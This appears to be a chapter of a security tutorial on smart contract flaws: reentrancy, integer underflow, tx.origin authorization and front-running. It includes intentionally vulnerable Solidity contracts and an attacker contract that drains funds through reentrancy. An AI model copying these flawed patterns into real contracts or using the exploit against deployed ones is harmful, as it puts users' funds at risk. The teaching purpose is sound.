---
title: 'Chapter 2: Smart Contract Vulnerabilities'
description: Reentrancy is arguably the most famous smart contract vulnerability,
  responsible for the 2016 DAO hack. It occurs when a contract calls an external un...
keywords:
- AppSec
- Cybersecurity
- Security
- Guide
- Tutorial
- '07'
- Specialized
- Blockchain
- Security
- '02'
- Smart
- Contract
- Vulnerabilities
- Md
slug: /specialized/blockchain-security/smart-contract-vulnerabilities
---


# Chapter 2: Smart Contract Vulnerabilities

## 2.1 Reentrancy
Reentrancy is arguably the most famous smart contract vulnerability, responsible for the 2016 DAO hack. It occurs when a contract calls an external untrusted contract before updating its own internal state. The untrusted contract can recursively call back into the original function, extracting funds before the balance is zeroed.

### Vulnerable Code Example
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        // Vulnerability: External call before state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // State update happens too late
        balances[msg.sender] = 0;
    }
}
```

### Exploit Code Example
```solidity
contract Attacker {
    VulnerableBank bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    // Fallback function triggered when receiving Ether
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // Reenter!
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}
```

## 2.2 Integer Overflow and Underflow
Prior to Solidity 0.8.0, arithmetic operations would wrap around on overflow/underflow. An attacker could exploit this to drain funds or bypass checks.

### Vulnerable Code Example (Solidity `< 0.8.0`)
```solidity
pragma solidity ^0.7.6;

contract VulnerableToken {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) public {
        // Vulnerability: amount could be greater than balance, causing an underflow
        require(balances[msg.sender] - amount >= 0, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}
```
*Note: In Solidity 0.8.0+, these operations revert by default. To explicitly wrap, use `unchecked { }`.*

## 2.3 Access Control Flaws (`tx.origin` vs `msg.sender`)
A common mistake is using `tx.origin` for authorization. `tx.origin` is the original external account (EOA) that initiated the transaction, while `msg.sender` is the immediate caller (which could be a contract).

If a contract relies on `tx.origin`, a malicious contract can trick the user into calling it, and then forward the call to the vulnerable contract, bypassing the check.

### Vulnerable Code Example
```solidity
contract Phishable {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function withdrawAll(address payable _recipient) public {
        // Vulnerability: Relies on tx.origin
        require(tx.origin == owner, "Not owner");
        _recipient.transfer(address(this).balance);
    }
}
```

## 2.4 Front-Running & MEV
Because transactions sit in a public mempool before inclusion in a block, attackers can observe pending transactions. If an attacker sees a profitable transaction (e.g., a large decentralized exchange trade that will move the price), they can submit their own transaction with a higher gas fee to get processed first.

**Types of MEV:**
- **Front-running:** Executing a transaction before the target.
- **Back-running:** Executing right after the target.
- **Sandwich Attack:** Front-running a user's buy order (driving the price up) and back-running it with a sell order (dumping at a profit).

**Mitigation:** Commit-reveal schemes, slippage tolerance, and private transaction pools (e.g., Flashbots).
